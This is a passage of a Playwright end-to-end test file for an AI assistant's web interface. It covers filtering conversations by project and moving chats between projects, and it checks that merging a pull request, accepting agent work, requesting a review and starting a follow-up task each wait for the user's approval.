			const list = chats.filter((c) => !filter || (filter === 'none' ? !c.project : c.project?.id === filter));
			return route.fulfill({ json: list });
		}
	);
	await page.route('**/api/workspaces/test/conversations/chat-1', (route) => {
		if (route.request().method() !== 'PATCH') return route.fallback();
		const body = route.request().postDataJSON();
		requests.patches.push(body);
		tagged.project_id = body.project_id;
		tagged.project = projects.find((p) => p.id === body.project_id) ?? (null as never);
		return route.fulfill({ json: tagged });
	});
	return requests;
}

test('filters conversations by project, tags rows and moves a chat to another project', async ({ page }, testInfo) => {
	await fixture(page);
	const requests = await projectFixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const nav = page.getByRole('navigation', { name: 'Conversations' });
	// Rows carry their project; the issue chat and the loose chat have none.
	await expect(nav.getByText('Launch', { exact: true })).toHaveCount(1);
	await expect(nav.getByText('Launch', { exact: true })).toBeVisible();
	await expect(nav.getByRole('link', { name: 'Release notes' })).toBeVisible();
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('project-chips-desktop.png') });

	const filter = page.getByRole('combobox', { name: 'Project filter' });
	await expect(filter).toHaveText('All projects');
	await filter.click();
	await page.getByRole('option', { name: 'No project' }).click();
	await expect(nav.getByRole('link', { name: 'Release notes' })).toBeVisible();
	await expect(nav.getByRole('link', { name: 'A persistent conversation' })).toHaveCount(0);
	await filter.click();
	await page.getByRole('option', { name: 'Launch' }).click();
	await expect(nav.getByRole('link', { name: 'A persistent conversation' })).toBeVisible();
	await expect(nav.getByRole('link', { name: 'Release notes' })).toHaveCount(0);
	expect(requests.lists).toEqual([null, 'none', 'p-1']);

	// An issue chat follows its issue's project, so it cannot be moved.
	await filter.click();
	await page.getByRole('option', { name: 'All projects' }).click();
	await nav.getByRole('button', { name: 'Actions for ENG-1 · Fix login' }).click();
	await page.getByRole('menuitem', { name: 'Move to project' }).click();
	await expect(page.getByRole('menuitem', { name: 'Company' })).toBeDisabled();
	await page.keyboard.press('Escape');
	await page.keyboard.press('Escape');

	await filter.click();
	await page.getByRole('option', { name: 'Launch' }).click();
	await nav.getByRole('button', { name: 'Actions for A persistent conversation' }).click();
	await page.getByRole('menuitem', { name: 'Move to project' }).click();
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('move-to-project-desktop.png') });
	await page.getByRole('menuitem', { name: 'Company' }).click();
	await expect.poll(() => requests.patches).toEqual([{ project_id: 'p-2' }]);
	// It no longer belongs to the filtered project.
	await expect(nav.getByRole('link', { name: 'A persistent conversation' })).toHaveCount(0);
});

test('a new chat starts in the filtered project and the filter is remembered', async ({ page }, testInfo) => {
	await page.setViewportSize({ width: 390, height: 844 });
	await fixture(page);
	const requests = await projectFixture(page);
	await page.goto('/test/assistant');
	await page.getByRole('button', { name: 'Conversations' }).click();
	const filter = page.getByRole('combobox', { name: 'Project filter' });
	await filter.click();
	await page.getByRole('option', { name: 'Launch' }).click();
	await expect(
		page.getByRole('navigation', { name: 'Conversations' }).getByText('A persistent conversation')
	).toBeVisible();
	expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('project-filter-mobile.png') });

	await page.reload();
	await expect.poll(() => requests.lists.at(-1)).toBe('p-1');
	await page.getByRole('textbox', { name: 'Message' }).fill('Plan the launch');
	await page.getByRole('textbox', { name: 'Message' }).press('Enter');
	await expect.poll(() => requests.creates).toEqual([{ title: 'Plan the launch', project_id: 'p-1' }]);
});

test('asks for approval before merging the reviewed pull request', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'Merge approval is pending.' };
	state.messages = [userMessage, answered];
	state.tools = [
		{
			id: 'tool-10',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 0,
			call_id: 'call_10',
			name: 'merge_pull_request',
			input: { identifier: 'ENG-1' },
			status: 'completed',
			output: { approval_id: 'approval-2', status: 'pending_user_approval', identifier: 'ENG-1' },
			created_at: conversation.created_at
		}
	];
	state.approvals = [
		{
			id: 'approval-2',
			conversation_id: 'chat-1',
			tool_call_id: 'tool-10',
			action: 'merge_pull_request',
			actor_id: 'user-1',
			issue_id: 'issue-1',
			payload: {
				identifier: 'ENG-1',
				title: 'Dark mode',
				task_id: 'task-9',
				repository: 'acme/app',
				pull_request: 12,
				pull_request_url: 'https://github.com/acme/app/pull/12',
				commit: '0123456789abcdef0123456789abcdef01234567'
			},
			status: 'pending',
			expires_at: '2026-10-27T10:00:00Z',
			created_at: conversation.created_at,
			updated_at: conversation.created_at
		}
	] as any;
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Merge pull request #12 for ENG-1?', { exact: true })).toBeVisible();
	await expect(
		page.getByText('Squash-merges the reviewed commit 0123456 of Dark mode in acme/app.', { exact: false })
	).toBeVisible();
	await expect(page.getByRole('link', { name: 'Open pull request' })).toHaveAttribute(
		'href',
		'https://github.com/acme/app/pull/12'
	);
	await page.getByRole('button', { name: 'Approve', exact: true }).click();
	await expect(page.getByText('Merged the pull request for ENG-1', { exact: true })).toBeVisible();
	await expect(page.getByRole('button', { name: /Coding agent on ENG-1/ })).toHaveCount(0);
	expect(state.decisions).toEqual(['approve']);
});

test('asks for approval before accepting work in Kuayle without merging', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'Acceptance approval is pending.' };
	state.messages = [userMessage, answered];
	state.tools = [
		{
			id: 'tool-11',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 0,
			call_id: 'call_11',
			name: 'accept_agent_work',
			input: { identifier: 'ENG-1' },
			status: 'completed',
			output: { approval_id: 'approval-3', status: 'pending_user_approval', identifier: 'ENG-1' },
			created_at: conversation.created_at
		}
	];
	state.approvals = [
		{
			id: 'approval-3',
			conversation_id: 'chat-1',
			tool_call_id: 'tool-11',
			action: 'accept_agent_work',
			actor_id: 'user-1',
			issue_id: 'issue-1',
			payload: {
				identifier: 'ENG-1',
				title: 'Dark mode',
				task_id: 'task-9',
				generation: 2,
				pull_request: 12,
				pull_request_url: 'https://github.com/acme/app/pull/12',
				commit: '0123456789abcdef0123456789abcdef01234567'
			},
			status: 'pending',
			expires_at: '2026-10-27T10:00:00Z',
			created_at: conversation.created_at,
			updated_at: conversation.created_at
		}
	] as any;
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Accept the work on ENG-1 without merging?', { exact: true })).toBeVisible();
	await expect(
		page.getByText('Completes attempt 2 of Dark mode in Kuayle. Pull request #12 stays open and is not merged.', {
			exact: false
		})
	).toBeVisible();
	await expect(page.getByRole('link', { name: 'Open pull request' })).toHaveAttribute(
		'href',
		'https://github.com/acme/app/pull/12'
	);
	await page.getByRole('button', { name: 'Approve', exact: true }).click();
	await expect(page.getByText('Accepted the work on ENG-1 without merging', { exact: true })).toBeVisible();
	await expect(page.getByRole('button', { name: /Coding agent on ENG-1/ })).toHaveCount(0);
	expect(state.decisions).toEqual(['approve']);
});

test('a requested review and a follow-up wait for approval in the chat', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'Review approval is pending.' };
	state.messages = [userMessage, answered];
	const call = (id: string, sequence: number, name: string, approval: string) => ({
		id,
		conversation_id: 'chat-1',
		message_id: answered.id,
		sequence,
		call_id: `call_${id}`,
		name,
		input: { identifier: 'ENG-1' },
		status: 'completed',
		output: { approval_id: approval, status: 'pending_user_approval', identifier: 'ENG-1' },
		created_at: conversation.created_at
	});
	state.tools = [
		call('tool-20', 0, 'request_agent_review', 'approval-20'),
		call('tool-21', 1, 'follow_up_task', 'approval-21')
	];
	const base = {
		conversation_id: 'chat-1',
		actor_id: 'user-1',
		issue_id: 'issue-1',
		status: 'pending',
		expires_at: '2026-10-27T10:00:00Z',
		created_at: conversation.created_at,
		updated_at: conversation.created_at
	};
	state.approvals = [
		{
			...base,
			id: 'approval-20',
			tool_call_id: 'tool-20',
			action: 'request_agent_review',
			payload: {
				identifier: 'ENG-1',
				title: 'Dark mode',
				task_id: 'task-9',
				harness: 'claude-code',
				focus: 'Error handling',
				post_to_pull_request: false,
				pull_request: 12,
				pull_request_url: 'https://github.com/acme/app/pull/12',
				commit: '0123456789abcdef0123456789abcdef01234567'
			}
		},
		{
			...base,
			id: 'approval-21',
			tool_call_id: 'tool-21',
			action: 'follow_up_task',
			payload: {
				identifier: 'ENG-1',
				title: 'Dark mode',
				task_id: 'task-9',
				generation: 1,
				instructions: 'Fix the review findings'
			}
		}
	] as any;
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Review ENG-1 with Claude Code?', { exact: true })).toBeVisible();
	await expect(
		page.getByText('The agent reviews commit 0123456 of pull request #12 without pushing anything.', { exact: true })
	).toBeVisible();
	await expect(
		page.getByText('The findings stay in Kuayle; nothing is posted on GitHub.', { exact: true })
	).toBeVisible();
	await expect(page.getByText('Error handling', { exact: true })).toBeVisible();
	await expect(page.getByText('Start a follow-up on ENG-1?', { exact: true })).toBeVisible();
	await expect(page.getByText('Fix the review findings', { exact: true })).toBeVisible();
	await page.getByRole('button', { name: 'Approve', exact: true }).first().click();
	await expect(page.getByText('Claude Code review of ENG-1 started', { exact: true })).toBeVisible();
	expect(state.decisions).toEqual(['approve']);
});
